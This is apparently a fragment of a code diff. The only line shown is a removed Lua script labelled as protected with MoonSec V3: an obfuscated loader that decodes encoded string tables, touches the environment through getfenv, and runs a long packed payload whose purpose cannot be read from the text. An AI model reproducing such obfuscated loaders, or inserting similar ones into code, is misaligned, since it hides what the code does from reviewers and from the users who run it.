@@ -1,1 +1,334 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _SFmwgWcezbQw = a; end)); return(function(c,...)local _;local r;local n;local t;local a;local s;local e=24915;local d=0;local l={};while d<721 do d=d+1;while d<0x35d and e%0x4046<0x2023 do d=d+1 e=(e*159)%32235 local f=d+e if(e%0x149e)>=0xa4f then e=(e+0xe0)%0x67a6 while d<0x3d4 and e%0x16b0<0xb58 do d=d+1 e=(e+669)%14985 local n=d+e if(e%0x487e)>0x243f then e=(e*0x3c4)%0x8b93 local e=25277 if not l[e]then l[e]=0x1 _="\4\8\116\111\110\117\109\98\101\114\86\113\120\118\84\67\100\104\0\6\115\116\114\105\110\103\4\99\104\97\114\81\86\86\71\105\100\90\113\0\6\115\116\114\105\110\103\3\115\117\98\110\97\121\98\102\110\114\86\0\6\115\116\114\105\110\103\4\98\121\116\101\67\66\70\118\97\66\74\65\0\5\116\97\98\108\101\6\99\111\110\99\97\116\112\100\102\122\112\76\75\95\0\5\116\97\98\108\101\6\105\110\115\101\114\116\73\115\122\79\116\66\81\83\5";end elseif e%2~=0 then e=(e+0x3d)%0x145 local e=28692 if not l[e]then l[e]=0x1 r={};end else e=(e*0x1d7)%0x98fd d=d+1 local e=40239 if not l[e]then l[e]=0x1 a=string;end end end elseif e%2~=0 then e=(e+0x2cb)%0x4759 while d<0x1a7 and e%0x2d5c<0x16ae do d=d+1 e=(e*1001)%28662 local _=d+e if(e%0x3d26)<=0x1e93 then e=(e-0x41)%0x577d local e=37667 if not l[e]then l[e]=0x1 n=(not n)and _ENV or n;end elseif e%2~=0 then e=(e-0x371)%0x31bf local e=31416 if not l[e]then l[e]=0x1 t=function(l)local e=0x01 local function d(d)e=e+d return l:sub(e-d,e-0x01)end while true do local l=d(0x01)if(l=="\5")then break end local e=a.byte(d(0x01))local e=d(e)if l=="\2"then e=r.VqxvTCdh(e)elseif l=="\3"then e=e~="\0"elseif l=="\6"then n[e]=function(e,d)return c(8,nil,c,d,e)end elseif l=="\4"then e=n[e]elseif l=="\0"then e=n[e][d(a.byte(d(0x01)))];end local d=d(0x08)r[d]=e end end end else e=(e*0x8e)%0x2299 d=d+1 local e=10333 if not l[e]then l[e]=0x1 end end end else e=(e-0x49)%0x9b37 d=d+1 while d<0x18f and e%0x1148<0x8a4 do d=d+1 e=(e+512)%15413 local t=d+e if(e%0xf96)<0x7cb then e=(e*0xbe)%0xb8a6 local e=56506 if not l[e]then l[e]=0x1 s=tonumber;end elseif e%2~=0 then e=(e+0x17c)%0x2659 local e=41773 if not l[e]then l[e]=0x1 end else e=(e-0x13)%0x8473 d=d+1 local e=21715 if not l[e]then l[e]=0x1 n=getfenv and getfenv();end end end end end e=(e*873)%11266 end t(_);local e={};for d=0x0,0xff do local l=r.QVVGidZq(d);e[d]=l;e[l]=d;end local function f(d)return e[d];end local l=(function(_,t)local c,l=0x01,0x10 local d={{},{},{}}local n=-0x01 local e=0x01 local a=_ while true do d[0x03][r.naybfnrV(t,e,(function()e=c+e return e-0x01 end)())]=(function()n=n+0x01 return n end)()if n==(0x0f)then n=""l=0x000 break end end local n=#t while e<n+0x01 do d[0x02][l]=r.naybfnrV(t,e,(function()e=c+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 r.IszOtBQS(d[0x01],(f((((d[0x03][d[0x02][0x00]]or 0x00)*0x10)+(d[0x03][d[0x02][0x01]]or 0x00)+a)%0x100)));a=_+a;end end return r.pdfzpLK_(d[0x01])end);t(l(59,":N,3dP)Truf6MKB=Mf"));t(l(225,"R2:N)A/0=rbo4Jtv2v))J,vp1J:N)0Av2orb4bt2MNv0:bNrAo0:ooJrJ/bt4tA=/b=0o2J<t)vNN2)J0/r:o0JQ04rv:r)b/U=)br4:tY+N2oNJAJ=0=:)402vJ2JNbA;0)=4)rJ,tN2A:N)0A//X0v4JJr v2r::v/2rb2o)t/vroANoA:0:b)ooo4v:2bFJN00rr/=A//=J2N:)A:/b=2bvootJvr2r):Ab0trvrAtS*A2A2bN:2{N:b^4tto2oNAA0N0r/o=4otAt=NB:=0:2vNtJPJrG8:b2oNA00r/4bJ)J/v04vtJ))rorvJNJJvNN=)A)b:/)rJ)tt22N2)t/)==b!o0oJ?bKb:N)o/rb2A80)O:^t:tA0/v:voJJAv/1/:0)t/tr2=4b0JAvt:0A)vt2vbJ4At/v/20NtA)A/00o)t2J2v::Jttmtr=or4vvN2=:vN/Ap=2rAbfJtvoovt_/40JbNooJ=n=5::b/bAJ=No2J/v2bo4tA//rrobt/btb}vN2AP0:=r=r40tA22vt:)0(24"));local e=(-5001+(function()local l,d=0,1;(function(e)e(e(e))end)(function(e)if l>496 then return e end l=l+1 d=(d-913)%42760 if(d%428)>214 then return e(e(e and e))else return e end return e end)return d;end)())local f=r.bEGesDFb or r.lpLHWaky;local te=(getfenv)or(function()return _ENV end);local _=4;local t=3;local j=1;local n=2;local function ne(u,...)local h=l(e,"S6_!ldca.4&0wvtD0&&:D2l%46t&!I.ivYcavd!lc!wd__ac04K!ddl64at7!j.7l_.dt6!dadv!_l:6dc&1DElmv!lD4wtDl_d!a_wu67cL0Ay 6TDD!gl64vt*!k.j6t.Dtlt%d6vc66c40wY6d_&wDdt6!w.svz_,0!_Datvl6dctwlwvll04<=ld!64Tv<_Qam6DcD&66!c!0D6ddt0l0*_64atdK&aDwDw66ccL0e=E0cPDdD0lDdd_!6.!vX_Qa9_va4wt06_ad%&eD*4lD.l4&!&o!c.4vw_d!:va66a!a=6rc_&Drlld4!Dl!d.l4h!aa4vl6._B4vyDdD&tt!ld4!&J_cd!a6w!6jcE0 cl0664D6lw4ht^!st.ll4lte6D._wd_6ad0d6!cll6&rtJ!U. _DaD0l_d.cw46!cda(t4dt&cDD6&.DvDv6_4aow;69vl64cv0d6!cl&6Dvd2!6.avu_3a+k..lvl_=la0d6lD6cl4yt !b.&6a.6vv_dl&.R6.alwl6ec!a&0D;D&aDalaltt__Da_ww6Da.at9!dD&v0Dla46tv!d4!4Dw66vcB0zBB&!pddw&dD!dldsvz!D.wv4_!adc6wqeGdC&kd60LjLlw44t!!64lv4_Dat.D6&a!0DztD6l_4rt5! tDl!_6.!w 6^cqDwcD0!;6dw&4p&l6&lt4!D.tw!_d._vc64c!0d&6D&l>4<tMa&v!6Dct0d_ta!wD6lcdd6&0D9lE4Cll4dD!!!4_v4!).lw46Dctd60cDZlz42!D.D&&D&ctvd!a!Twd_.cd0!6dcl&4DDltdt&&D&aDwDw66lch0%sF4_{Ddl0446t&!V.;v{_&0d!..Hww6Dc4wlv&6ml64ltK!B.G!a.6vv_d66c00ABodmt0d4&wDwe a6tw!wlnwcD666ca0GbUd+g!dD&tGlld4tDlv6_lapwN6Uw.6Dadw_&6Dcl%42t>a_Ddll4lvD_t66&40O(fdL-.cl0lY96&dD&Dla4atatt._wD6_cw0D6.6t&!DDlvdDvl!.4dvv__.!.DD6ac066ld60_0tl6&!t.l.dDt.Dvl_4dtz_cw4vv__adw%pcactDl_.vv6!llv0W6tcaac6dc!&d=_lt46tv!ddva6w.6Qcj0edUw_M4c!&DDtld&_.6tD_YaTwPa.vl_lazw!v&6DcDD4Vt44tv!a4dt_tta!wD6v_D&c6&__4.td_a4&&t!&4*vaw664c#0sLbazYld604g!R(4Dtw!l_6acwn6Aco64ct0w/4dt&d46D.!b.uvna!vD_vadwD6tcda>2&cd0!VlGQ4atDlll<v__6atwt6dcla6&6D&lZ4Qt2a6t4!vlYw!!4.!vl6dcvd6&dD?l 41l!4Dtw!D4_a6wD6xcP0Fl!w_)6c!&.0<!!4dD_lc.dt_tmcc4_06k!dz&eD/c60&dl!_.*vO_%aFwID+w6D5b6dD&rDJlqt!ld&_Dc!d4_4PI!aDwv6vc60tZlc!l64ct9!I.:!d.vv__dalv!06Vddy&zD*.wD6l_4dtwv6_la?wf6Rwl66al0d&6DdlU4-t244tv!6.avdw664cQ0*:<wl3.cd&vD_lt46t4!w_6alw(6jc)6tc60v9dD6ll4Ftb!yD4!d.6t_w660cA0;eG4.6lcl0Tt!ld&_Dc!4.!vdw66.c{0)3;wlMDdt0dDvl_4dD_v6_laYwW6Jv_64c!0.&6Dalu4(t<4cD_!D.vw_ead_c60cpndr&Xl^&DDwl44!tdv6_caCwI6iwc64cd0wAlc!l64lt7!M.jll.4vv_d66cc0(1{dZDad4&tDllD&a.6t4_PaKwxdvwD6Dct&!?dd!4Dt!dl&_t4!t.at!r.a4wl6lcd0tt6cl0l-_t6!0.LvC_)w3!_a4v!6DctaCtwd4&cDdt6!t.WvJ_Q06_lavw46t_*4! Ddv&vD6lt4lD!v6_aazwB6}0j6wc6w4pdc_0!46tc!P.*vzcvvd!la.wD6lX6d.&ED)l=vld_4DD9!l.Dta_t66c00/uMdHtwdD&!D6lw.%tw!644vd!_66cc03ZUdo6!cl0_D4lt4a.6vd_ anw).cw66wad0d&6DtlU4)tM.!t4!v41vw_d!8w_66ctwaZ6cc&d46tl!k.ov?4lvd!..lc600>qde&X!l&4E!d14wt6l4ctv6_vadc60tV2d9&?ld&tD0lt4DDa!tl20l_d.cw46!cdd_&NDJl24*t,D=tl6%__anwj6Pce4NDD0Dt6D6lc4LtE!?vl!D.ava_wadc60aBydz&J!.&dD6ll4dD_l!_6aDw/6FcZD!a_066!d.cnt!ld&_Dc!d4_4*6cl6c60!7Gd>&mc!&dD!t6!&.2v,_Yvw_Da6wl_!alw_q4dt&a46tD!g.xveaDwD6d.!wd___>46(add&t-l6&.DvDv6_da7wh6-vl64al0w}dD6lD4:tk!(v!!d.wvd_!.l.EFka_046!dD&tDdd_!6w&vV_xaL_..lvl_Na!.&wD6D0_D6dadtta!44lv.!da_vd_!cdw_L!dD&t,lld4tDlDt.!vD_v!Dw_6wcD0DRld_&6DwlwdD&v!_.6v!_0!vvd_8a!avpcdD0_0vlw44t_l!lDvv_6a4wtvDalwd6_cl&wDdt6!w.yv(_nwD6Dcdv!6da_a#t4!la&tD!D!6.vvE_xaf6Dc!&c6vaa0aDad!&d5&l_.6Dav6_ca1wT6p0d_!cdw_t4dll64lts!).}!.4ltl!z66cl0hz<d?6lc40CDdt6!..rv7_Xv4_!aDwt Dadw_NwD6l!4BtN!Evdl_.wa6vd6+cH0x_cwa#4dl0lD.6vca0c5.lcv._da4wa6.al.vvl_!a_46tt!N.Cv3aDwDN4cn.RK_cd0aV4dD&tw&!D.D.6vc_ia/w;acwD__cv066lD6la4Wt<!*vT!w.6v!_dd4wl06kldY&kD1.tD6lv4d.6l4_NaEw8a.vl_la9w!v&6DcDDll4&!t!!D4_vltta!wD6v_D066yd4cDmald4_t.!D.Dv0!!!D46t_!a..v!__a_wd6aca0_ocd6&?Dcl.4_t.!.aDvld.&_AclD&lwa*act&d_4at&D6lac0cswd44.w4Tv.qv&s_cav_h6dcv._.d.w_vld.a_D6la40Ddq_a4vDDcc!&l_ldk0cg_la.c0v!6c4w4_D44&cDlld0a6wda0_D.c!0dvvt6!D.Jv:_Oa&ila4v!_;cw06646:.tD6lv4d0&Dg_!a6w6ldcV0F%)0.6lcl0ho!6&dD&Dla4atatt._wD6_cw0D6.6t&!DDlvdDt6l!4!vd!l!vvl6.ad0vs_dt&6D4lwdDt4!v.6va_dlDw6_!a!0d6l!4&lwvt6!a.nvz_ow!_!._w4_Zalw!&6DclZ4Ht}att6!v.d&&tb66cD0yN<d)t_cd&wDwld&l&}_l4_v6_!a0w46tcad60.Dnl*49Bd4l&vDd.l4vtdal0lvd!^._kl_&cdw:6_4l0&Ddd#&__lc&c60lhOdP&Rle.Dt!!l!6.!v=_Ia+!d._ww06R!d#&nDV0! 4lt!6.dv9_/a9_vaDwt_lc.d6&&DAlU4C_64!t!!D4dvt!ld6wa6dtddQ&kD)l(D0th!u.8v6_#a(wP__c60883djv&DWl94)D_!a.Bvo_Pw!w^6WcHvc6vdM&(DHlc4rt6!}.&vg_l_!w76 c70cgHd6&HDlD!4VtT!N.avg_6agw3lcc>0Vhbd6&)DxlT&_.6!G. v;!&aEwE6:.#vd Cdq&1DVl2wvtodX4&v^_Pa2w(6Y&C0M6_c&&CD6le&!tE!<.ID)!.aMw66zc60m!.d;&jDvlN46ts!6.gv__8._v66Hc_0X6!dz&CDHc24ltb!_.Bv__F4vwj__&D0=g!d<w.D^lx42t*4v.%vl_*a6wb6*c10IIad9&_Dgll4bt_!?4_tw_3a!wR_&cx0#QCa,&.Dml!4Ot!!(.6v8!_.lwB6dczwlR)dB&XDJl.4/t!!H.dv3__a:w_d4cQ0l>Rda&>DklJ&_ta!u.dv=ccaHwz6Ba_00FCdc&uDdl>4<t{l_40vg_aa/vD6,cP05_Bd_&uD.l24Tto.v./v=_vaLwa6Uca0%N.d8&c5&lW4.tI!6.Yv6_Ra_wQ6pcD0Vj%d1&!DMl+4Xt%!D.MvV_La%w86Tcxw_6wdj&4Dhcl4{t/!m.mt _3a&w=6#c#04Gq.P&vDTl&4R_D!=4avW!_a.w^60c-6!)>du&z6Vl44Ktw!1.ev*ava,v__4c10vAZ&D&MDulj0JDd!X.tv2_=aVod6<a_DDq(dD&iL4lg4gtj!Bm4vb!FaOwl6zc90Ge)c&&n}il{46t{!_.st_!0a,v66Wan0p}odQ0_D!l#&_tul&.Zv;_54Owl6Ia_016_d^DwD*lZ&&tg!0.Zv0_f._w3_kad0-y&d;0cDPl04o6Itl.(v&_2wcw5llcpw_aldP&0Dka!4rt>!54_vl_nawwId.c;0RR}dx&.D3l048t_!Z._v(!FaDw16&cKvcZhd0&2D>l44ut0!O.7v#_6aVv__dci0wRn06&FD<l=&_Dd! .vvg!&a}w=6(.gwD%Cdv&-DvlFtwtbl_P.vq_ta{646{cW0}/Udw&EDwl,4wtO!t.zt:!4aEw06 wa0Y(wd/017dlg4&tWdD.ov0_8anwv6<c00%pfd-&6DFdu4.tz!0.)!a_;aaw,_1c_0%/&dJwtDJl04rtPad.}v0_Oadw:6#cE0(_wd(&wD:l*4-t!!K08vv_eaww#l(cL0aY9aG&&Dolv4Htn!xt&v1!_a_wr6tcTv_5Yd2&1DTd&4Otv!r.vv}_tazvG_!cW0w2n4_&WDvlUw}D&!^.wvxl!a%_^6-c3Ddohdv&xDYl;4!t<c,wlvL_vauD:6+0_0;_+c6&nDtl,4*tW.l.3t,_.ajwv6G&_0prtdRv^i6l?4vtBd!.F!1_jaWw66Gct01h%dV&!D aL4lto!t.</R_Tavwg_Qa40Xqtd<t_D{ld4>6?tl./vt_A4!wTa;cq0{c6dN&DD/lp4ht!!>0uvc_?aDwmlQc^Dtquci&dDElD4O__!+.cvsd(a!w/6DcBv!um0K&AD^l_4MD8!O.Fv;_!aJDg_6cCw%f^.;&Bl&l*4gtD!M46v#_.a w{61c%v!NPc6&kD6l34_tzlX66vo!Ra?b_6ha60G!Oc4&p9kl+0!tE4i.=vO!4aEw06ra+0%A6d,0L.4l:4&tgca.mv0_XaAda6;c001JgdJ&_DCa>4&t8!0.j6l_30!w<lOac0Qi0dCDaDuc64IDr!4.Gv&_Ma.wu60cfw_sldQ&0DU.64gtN!B&Ct__Ya0wU60c:F0;Lc_06Dolw4Lld!:.pv^lh.Dw+6vch0_mo.6&g6Qt.4Rtt!s._vn.4aUte__c/0D<Yd_&ND0lM0iD!!(4sv:__akvv6E./w!H;c6&{D_lE44tCdY.tvX!_aLw_6<&w0=YEc_&2D0l<&_to!_.ot}_6agw&6Wct0z;0db0_46lu40tV4..Pv)_Iac_!6nc00uctd#&6D/l642tlt!.nvU_/vtwk66cm0l0!d:&+D=0_4Mt6!,4_a6_oa0w:a.cU05V%a 6DDFl04Rt0!B._v)_ca.w960c)_aj(d6&kD6l#4l4!!=.:vf4aamw662a_d65Rd0&5DwlJ4yt:!ct!v)_0a#!a6Oc60HG6d3&l&!lr4pto&a.Uv6_y._c66Mc00mdddJ&ID9co&Dth!0.Xv0_Ja_wE6y&d07<wd*&RDHll4u6>0c.5vw_ w.wqctcZt26/dP&wDiat4hlc!O./t6_9avwG63cR06Bh.>&6D)lv4Ktc!,4_vk!(.ww#6wcFD&JVdv&=H_l44Ntv!u4&vY_;astr_6cI0v38dv&bD6l%&__D!:.Dv>d_a,w^6*cYDa)qdv&XDDlh4_tAdO.cv+_vaZwv6;ad0)ipdc&3DDlU4qtV!_.AtJ!dabwD6xaw0es4d{&,X_lu&Gt5!6.Hv2_fa7ww63a60r?&dJ&oDxl8&ltClN.bt6_xa6wx_sD40=5Dd}w0DCdf4ztQ.l.Wvv_KaDwb6_cLwk6.dB&wDFd.4Ttv!>.Mt6_5a0w,6_cK06euc_&tD{l04?_v!J.Ivs!_atwU6wcBw&Z%d;&H6Xd(4etw!N.wvQ_Dasv__0cM0t#C&6&OD(lp4xlw!O.wvM_taXw?6;cs_4Q%d0&iDVly4_tr!q4(v2_0a#w66Mc_0#_Jcv&KDwlC40t3c4.(t_!lazwt6k400x+kdX&YCdl94wtL!t.kv__;4Hwv6=cv0,XwdIwwDFd_4Dt/!D.Urw_;aJwf__I60N6 d,&!DFlj4CVU!0.#tx_P.CwLldcyw_r.d?06D2ll45tA!}4_t__=._wT!4c80%h7c_&lD,d!4}_a!H.Vvb_C..w5_gcLw!XOd7&-D}d.4Jtv!P.VvO_6aTw _ac:0vTXd?&eD>l,4Etd!C.tvg_ta>wi6b.uv.N(dD&{Dwljv4t l_4_v-!6aFv06hcZ0Ik,c4&o?_lx4zt%!H.xvc!&agv!6qcP0k-6dJ&_DRlN4DtX!A.hvv_?axw?6BcD0u+AdR&tDPlG4QtNlt.)vD_y.!wO66cuvMp&d9&DDblw4Obw!-4_tc_7.6w5!&co0H5Bc_0&DJd_4rt!!:.Xvml+a!w#__ckw_PH.d&JB_dw4bD!!5.lv^_}aEv__&cBwl7ba4&QDMlO&__D!K4dvgcaa+wQ6UcCD!Z;c_&iHdl^4,tT!E.tv5_DaTwW6Gc60<oXcw&LDDlX4ytf!9.ovX__aOvO6Nas0-XEdQwAm4lT&6tH!w.{64_G._v&6Qa!0el0dF&qDzlU4ltnll.hvV_^aTwP6ca&0-6dd2&dDAl64At_!9.mvD_Ua;wI6DcV0*Tqd/&DD lV4=D2!y.mvs_5trwL_6cKwdi/d6&?6fdd4jD6!=.wv:!ta-v_60cxw!/Waa&+D lf4__4!74lv9__a>wq6Mch_u Pc6&UBllE46tCdG4vv8!6akw06/440{6_c6&97!l#D_tG!^.Nvjcwa=v66#a!0G%_d wFD.l#&_t=l6.^9D_g._v46Qal0,!cdR&gDQli4!tgld.hv6_Fa)wi__al0m6cd%06Dql14OtVlw.<td_m.cwU66cn0_l4dp0cD*l!4}tn!H.k6w_L._w*_cc%0_G#aI06D(d!4=D6!=0DvY!_.aw)_dcBvMxIdq&EDCd64LDc!(.6vC_ aqv__0cjwa#m&Z&>Dul94JD_!#4cv(!aa:w66^c_D4W)ca&jDclg4{t;!gw_vu!!a3va6-c_0h_Xcc&y}llq&6tTdw.pt_!6a=vc6+.d0JL^dL0_DdlV&atL!!.*v{_V4^va6#aa0>6ad}vdD+d_46tHl..8vl_fauwQ__cD0Z64d=w4DWl=47D_aD.Wt&_C0aw?6Ic305Xcdb0aD8d&43tW!p.Xv!_s.lwH6?c3068FaE0cDedl4<D6!m4tv}!_aawH_cc(6l=fd)&oD_.44<Da!u.lvN_Barw2lac(wlQ-ca&AD6lq4Htv!=4lv=_nanwR6 cF0&CFcd&^/dlE4<tUdf.0v-!ca#v66j&40k6_dt&mP.l}0atq!j.Pv:!uaKv46<cC0j zdJ&c9&lL&&tP!..kv6_ma_w-6VcD0uGidQ0lDfl^4Ct?!D.,vU_A.dwW6?c50,atd?0cDed&4-t6!U.=vt_5aMw,66cP0/qQd4&mD^lx4ctB!}.mv6_aaBwn6s&!6Dct0t<dd!0l46t&!-.jvpa_td_tc!wd__ac04O!ddl64&t)!;.i6l.4t!_!aDwt6tcd0!6lD6ll4ZtF!Gta!6.vvdw66acO0r(W&!6ldd0m#2ld4l.6v&_AaTwXdawd_ld!0d6_cc&4D!ldld.CvG_iamtt6sc;0A/?d2&3DNlC__t/!6.gvA_haxwj6cvc0?%6d{&tDol64Lt{!k.l.!_,a<wz6tc:06n8c_l6D#l64Xtl!g.gv7l-.awp66c=06mQdc&{G_l04Kt!!/._vI_2aew+64cX06BQd!&ND_l*0%td!W.6vX_6aUwd67.3w0VId6&+D6lC46t:!_w4v(_!a1wP61cJ0EeE&_&mD6lW4!t !_.Fv;lta9w66^c60>)Kdx&l&!lC4Btoll./v6_Oa*d_6Ec60my6d/&BD#lcect>!6.Gtl_ a6wU6Ocq0l0!dp&jDHdl4:t6!x.Uc__%a6w/66cC0Qzea*6wD<l64Tt6!1.!vg_F&6wk66c20_yrd6&3D:ac4ZtB!I.6v}_BaWw66qcf0RM.db&9D9l64&tM!*.x6a.dtl6!adv__cc40!MdD6la47t^! v=!w.6t4_d._v!0_4&t4!4.4v4_444cD.6vl_Va)w:.aw664ald6&0DVl>4z_a4dDl6!..v4_walv_6dctd6&dDQlh4Id:4!t6!w.wa6wl67co0Fca06bvddl64ltX!;.#!t.dt.!l_!cq0gg3c_D4DBly4Gt.!n.#vK!_avw?66c#0as8dW&56rd_4:t6!*.6vP_6aov_6dc+0!9Md_&3D,l^4gD{!I.6vQ_!akw_6b.)0w:Id6&MD6l(4dt;!V4wvQ_6axw_61c_0+Clb!&iD{lV&rtU!6.mt_w6a%wd6Ycc0NnudK&c &l^4ctW!x.Yv6_Ra6wu6PcD0JIqd#&lDblx4;ti!!.rvd_*a_w^66cbw_6cd7&dDBll4%t*!G4_v0_+acw26!c10T{qdA&DDzld4it_!).6vj_g._w56!c}0GFrd/&BDc.v4%t+!(..vy_6aWw_6Fclc!z-dF&=D.lU46tz!;0cvK_?aBw66Ecy07V6dQ&ODFlD4ytP!^.6v._#a8w d.vd6vc60tuDd4&l46tc!^.>v#c!0c!_a6wv6d8_d9&)D,l}4At-!H.gv6_la1wU6Nwa66cv0d&6D4lP4ht?a!t.!64_v6_!.lwd__x6da&iDulTt8lw46D4!d4_t!w6_6cq0zgu&_XdcZ&wD4l!46Dl!d.lw!!laDv_66ca0d&6XBlk4*tRa.Dd!v.6vt_Da4wl9_cD0D6llK&6W_dl!6.&v{_Ta#_vadww6dcd4d6cdd&t^lt6ld.KvK_k0c_4atwlDcc4w_6!cl.!D.l44wtl6D.c0!_wa6v!_!q6d&&eDIlevald&lv!!d4_tc_4a!wd06Y&d1&IDi.cDDd_4!td6c.4vd_walc600+(d &s!w&DD!l64wv-!w.6t4_d._c60&(+d)&C!c&4z_ld.!tdl_4cvd!_66cc0j;udbt.dd&6Dwdl4.&&vE_Gamwyl!cq0nfRdT&ZD{l-&_t0!1.6vo_la/w36i.Zw!yOd6&UD6l540tTl_.&v/_!aNwc6Fcr0ZhRc6&zD6lH4!t5!_.+DM_la#w66+c60z{vdr&cD6l{4btm!4.nv6_Wa6w 6l6!0/H2dA&4Del64Ftlt!.)vC_}44wn66cr0H4_dY&ODklC4ut1!x&x/D_jaIw}6fc}0d?2aA&lDelV48tW!N.&v(!_a0wJ6_cF0wZzdN&^DWd!4}tn!+._vi__a*wc6acQ0#kuc6&mD6l348to!l!!vJ_8arv66bc60j*l(!&3D^lB04t5!6.iv^0_aBwV65cK0BAGdWwnrDlq4qt2!b.evd_W4:vD6zc50zOhdU&6DYcf&Dt7!=.<vn_raDwV6t4&0M !dqw4DNl64jti!A.l.!_VaEwI!4c(06o,c_l6D2lj4ktl!P.BvXl/0&wm61c*0hTod0&Gg_d04At_!%.cvX_3akwU_dcW0q#Xd_&}D_lk0btl!Z.Xv=_Na7wv6P.Rw45-dx&hDMlb4dtsdM.&ve_*ahw36Gc.0n5Zd.&=D6l+4:tI!Z.eDz!Da*w66(c60RTdd?wm3llJ46tm!6.Vv._u4kv66%c60YW6dz&_D}du4&tB!;.5v__Qa6w-__ct0X Hd1&lD l<493(lv.>vL_YaTws6ac#vJ6cdb&9Dzl{4mt4!E&rvc_fauwT6Yc90tx<dy!_Dgl_4It:!/.Yvu_nDDw56Zcg0_Xnd6&zDjac41t:!2.6v;_Aabw{6^cO0Ik*ds&6D_l=4KtI!6.av1_Ma*6datw06tcDwa+tD6ld4ht;!IDP!!.6vw_w6wcT0W 5c_l6DBlA4Mt_!7.=v5_c.&wu66cI0RqMd6&GD_lh4L.c!;.UvJ_Fa*wP6Ocydcg<dI&KD6l;43tU!PvcvL_panw_6-c605}cwc&+Dul244tj!6.Vv7_5ala!6{c10fO4d?&6D lc60t1!_.,v&_-a6wL66cU0l0!dK&LDnl&4/t6!H4_6D_fa_w766ce01#GdO&wDkl_4Et_!U.9vM_W&cwH6Zc-06R9dm&<D6lp43th!6.3vU_Ha6vt6VcV0{la0d6l!!&Dsdlt&lD_l4a_vd_aa4wD6tlc0D6_lL&wD6d44dD_664!t4_ta!cc0L;Gd^&i&_lK47ty!s.Ov5_94hwD6{cs0Kf#dA&6DelT&!t !_.*v6_nahw)68ct0Kb>d)&_Dblq4,tHll.?v(_=aYws6mc,07Rcdu&<D l64ytu!3.Qv%_gaiw86La00qjIdn&6D&lU4Pt(a4vl6dcvwQV4d!&0Mdd;d_&zDxlJ4?tY!Y.xv^_6awwO6>cRoza_046!dD&ttD_4.lwd6va!a6w&6)c<0mla0d6ll!&ds_dc44t!!d_6avwL65c7<_cd0v}4dt&a3llD4t&ZH.da&bw66lc90=-rwaV6d40l46t0!^.Yv:c4tl_dav&.66ct0lBwdd0_46tl!).Avsctv6_vadc600<xd,&R!w&DD!l64wvG!w.6t4_d._c604FVd5&ula&DK_l0&!DL!6.!vdw660cy0O*Z4aCdcl.!D.l44wtll_.dvtw66.c50Tf<4_u6d!&0qml64!t0v6_4aOw{6n&!6.c6w_h6d!0lDdd_!6.dvB_^an!ra6w4__a!d6&4Dql^41da4DD_!04!tG_6a!wd066dd?&qDO.cD4lt4lwc!44_t!!ld!w.64cw0ltDdc.!Dwl6&!D!v6_dafwT6,wa64ac0d6_D6lc4Ltu!Jv_!d.vvD!ladc60csNdZ&)le&6/_ld4tDlv6_wa#wh6K0d6tcdw66dd40BtllD4Dtwl!_6awwr6)c,D4ctwcYDd0&dt!ld&_Dc!d4_a6w.6Kck0nl.wd vd6&tDDl44l.6va_sa)wWcEww66a40d6_c!l64&tW!O.g__4dvt6!adv__cc40!{dD_lK4Kty!-.;vZll0,w66ac)0ooM&!6ldd0RJ,ld4l.6vl_Ta}wHaaw66vcd4c&7D*l%&_t4!%.Cv:_da5w86,a_wcknd6&y{0lz4etJdk._vh_6anw66qaa0N_Ncd&OD6l}46tr!4.gDn!0aOw66<c60Tn.dm0_Pll-4_txl0.XvO_e4{v_6Gc_09+_d2&&DEcG&DtC!_.sv__}._wF!}Dl0xB_d8&_D%la4*nn!c.{v__Za_wQ_dcAw_6&dJ&lDylD4Pt*! &ZvD_5alw;6lcI0!5qam0wD%ll41tl!<46vV_9.6wf6lcU0l:Ud#&56ql64Vtl!f.lv^_6a;w;4Dcf0_FIdl&OD6l;&_K&!A._vO_taKwF63a_00h#d!&q)0lk4xtzd%.4v>_!aBw!6haa0FyRc_&rD!lX4!t9!6.EDo_!aNw!6{c!071wdpwTZvl*4!t/!!.Uv0_xauvc6Jc!0BTldM&JD(lk!dt}!_.bv:_:alw56l6!0s21dxw_D8l64=#LlD.9va_bacw{6.cy0c&tdi&aD#dv4#t6!m.FvY_l_!wP6zcFwvPNd6&>DlD!4MtM!G&_v-_6a*v_06cL0a*^c0&>D1lN0iDD!T.avs_aa/va6:.HwD/8da&pDal/44tfdL4DvX_aa{wa6-cv0f6}t4&YDclC&!tT!a.%vccvaxw_68a40Fm6dh&_D5lll!tC!J.It4_ya6wj__i60o?_d<00DslV4J?(v0.Rv__Oa_we_acR0i<Dd,&_D1l_4ht6!;&fv!_ha_wJ6_c>0v*ndB0RDMlP4rt_!P.MvX!_..w56_cnw0Tud>& 6pld4#t_!>._vX!aant)6&c:0_iid_&zD4lq0CDD!z._vP__a*wv6;.Altg}d_&HD_lF&jt-l_.4vk_laVvc6#c/0UQ=dv&OD_l%4lt8!_.gD+_&aQw_6xc_0>6ldH&3QllP4_th!_.Wv6_Wacv&6Uc_0po/d7&6D^l64uts!D.bvQ_;a5wN6:cTw_&6d2&!DOd04(tb!)&bta_Ha!w56!c+0lUCc_&DDBld4ND.!=.iv8_;.awT6!c=0doNd_&F6Bd44zt!!9.!vx!&aIt^_0c}0!/xd!&ZDcl:4e.!!1.!v{__aMw_6>cc_cG7d!&#!dlu46tT!z.Evlv!a5wU6Y&d0ys6d 0_!DlA4!t*!_.+v^_R._(D6Icl0j64dO&-D=d_vDtu!d.;t4_ra2wM6la00H)!dstlDnl647t*!..+va_sa_wL6ycm0{64d3&aD-l642t6!G.lGd_/a!wMd6c+06oQdld!DHl94k6l!V.6v9_p&cw86 cU06iQdb&{D6lX4*t<!!.>v^_qa6w46Ucp0gc!0D6_dD0dTll44ttdv6_caFwo6Xw!__cd066lddl64ct=!j.Gl_.dt!!davwd0&iRdg&Po_t64jt6!p.6vr_Wa%tK_Dcp06KBd6&oD!lP&_.6!N._v,_6aQw?6X.}wD:Cd_&?D_lu4_ts!c4&vX_!aZwU6Tc60Q-_dE&fDDl^4qt)!N.WvC_(aLcc6;cJ0gVGdh&8DOlBD&tT!_.Pv!_,azwY6A0.0/36d<&JDOl64>txcc.uvm_ea6wW6TcW06}hd &7=clb4 